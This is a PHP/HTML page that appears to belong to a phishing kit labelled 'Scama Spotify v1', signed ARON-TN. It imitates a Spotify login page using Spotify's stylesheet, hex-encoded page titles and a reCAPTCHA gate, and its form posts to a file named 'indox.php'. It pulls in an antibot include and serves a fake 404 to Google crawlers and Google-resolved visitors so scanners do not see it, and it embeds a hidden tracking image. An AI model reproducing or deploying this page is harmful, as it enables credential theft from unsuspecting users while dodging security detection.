<?php   
/*
 $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\      $$$$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |     \__$$  __|$$$\  $$ |
$$ /  $$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |        $$ |   $$$$\ $$ |
$$$$$$$$ |$$$$$$$  |$$ |  $$ |$$ $$\$$ |$$$$$$\ $$ |   $$ $$\$$ |
$$  __$$ |$$  __$$< $$ |  $$ |$$ \$$$$ |\______|$$ |   $$ \$$$$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |        $$ |   $$ |\$$$ |
$$ |  $$ |$$ |  $$ | $$$$$$  |$$ | \$$ |        $$ |   $$ | \$$ |
\__|  \__|\__|  \__| \______/ \__|  \__|        \__|   \__|  \__|
                                                                 
#==========================================#
#             Scama Spotify v1             #
#       facebook: fb.com/amyr.gov.tn       #
#==========================================#

 $$$$$$\   $$$$$$\    $$\   $$$$$$\  
$$  __$$\ $$$ __$$\ $$$$ | $$  __$$\ 
\__/  $$ |$$$$\ $$ |\_$$ | $$ /  $$ |
 $$$$$$  |$$\$$\$$ |  $$ | \$$$$$$$ |
$$  ____/ $$ \$$$$ |  $$ |  \____$$ |
$$ |      $$ |\$$$ |  $$ | $$\   $$ |
$$$$$$$$\ \$$$$$$  /$$$$$$\\$$$$$$  |
\________| \______/ \______|\______/ 
*/                                                     
session_start();
error_reporting(0);
include "../../../ARONXBOT/XSPOTIFYXBOT.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> &#x53;&#x70;&#x6f;&#x74;&#x69;&#x66;&#x79;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65; </title>
<link rel="icon" href="./ARONXFILES/lib/img/spot.ico">
<script src='https://www.google.com/recaptcha/api.js'></script>
</head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<title>&#x4c;&#x6f;&#x67;&#x69;&#x6e;&#x20;&#x2d;&#x20;&#x53;&#x70;&#x6f;&#x74;&#x69;&#x66;&#x79;</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
<link rel="icon" href="../../lib/img/spot.ico">
<link href="https://accounts.scdn.co/css/index.815c601ede0bda3f6d4b.css" media="screen" rel="stylesheet">
<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/v1550471573786/recaptcha__fr.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script>
<meta ng-non-bindable="" sp-bootstrap-data="{&quot;phoneFeatureEnabled&quot;:false,&quot;user&quot;:false,&quot;BON&quot;:[&quot;0&quot;,&quot;0&quot;,-1506835902]}">
</head>
<body ng-controller="LoginController" class="ng-scope">
<div ng-include="template" class="ng-scope"><div sp-header="" class="ng-scope"><div class="head ">
<a class="spotify-logo" tabindex="-1" title="Spotify"></a>
</div>
</div>
<center>
 </center>
 <center>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> 
<script>
$(document).ready(function(){
 $("form").submit(function(){
   var response = grecaptcha.getResponse();
      if(response.length == 0){
          alert('Please check the Captcha box.');
    return false;
 } 
 });
});
 </script>
 
</head>
<body>
   <form action="indox.php" method="post">
   <div id="html_element"></div>
<td style="padding:0px 0 0px 0;" valign="middle" align="center">
<table cellspacing="0" cellpadding="0" border="0">
<tbody>
<tr>
<td width="19" valign="middle" align="center">
<div style="height: 39px;"><img src="https://proxy.imgsmail.ru/?email=mrropot7%40mail.ru&e=1506736332&h=OEL01GfOc8MgteX016O71w&url171=cHAuaW1hZ2VzLmhhcm1vbnkuZXBzaWxvbi5jb20vTm9ydGhBbWVyaWNhL05BLzIwMTcvQXVnLzAxMzIzOTEzLzA5MDdfMDVfQ1NUX05NSl9UcmlnZ2VyX1JlbGF1bmNoX0VtYWlsX09uc2l0X0Rlc2sucG5n&is_https=1" alt="" style="display:none;" width="19" height="39" border="0"></div>
</td>
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="content-type">
  <title></title>
</head>
<body>
<button class="btn login-button btn-submit btn-small"
 id="btnLogin" type="submit"
 style="border: 0px none ; margin: 5.5em 0.5em 0.5em auto; padding: 16px; background: rgb(30, 215, 96) none repeat scroll 0% 50%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; color: rgb(256, 256, 256); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 18px; line-height: 1em; font-family: Arial,sans-serif; overflow: visible; text-transform: none; cursor: pointer; text-decoration: none; vertical-align: middle; letter-spacing: 0.1px; text-align: center; position: relative; min-width: 98px; min-height: 37px; width: 300px; max-width: 100%;">&#x43;&#x6f;&#x6e;&#x74;&#x69;&#x6e;&#x75;&#x65;</button>
</body>
</html>
   </form> 
 <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
 async defer>
 </script>
</body>
</html>
<div class="container-fluid login ng-scope">
<div class="content">
<div class="row ng-scope" ng-if="showContinueLabel">
<div class="col-xs-12 text-center">
</div>
</div>
</div>
<div class="row row-submit">
<div class="col-xs-12 col-sm-6">
<div class="checkbox">
<label class="ng-binding">
</label>
</div>
</div>
</div>
</form>
<div class="row">
<div class="col-xs-12 text-center">
<p>
</p>
</div>
</div>
<div id="sign-up-section">
<div class="row">
<div class="col-xs-12">
<div ng-controller="SignUpController" class="ng-scope">
<div ng-include="'signup.ngt'" class="ng-scope"></div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="divider"></div>
</div>
</div>
</div>
</div>
</div>
<div></div>
</body>
</html>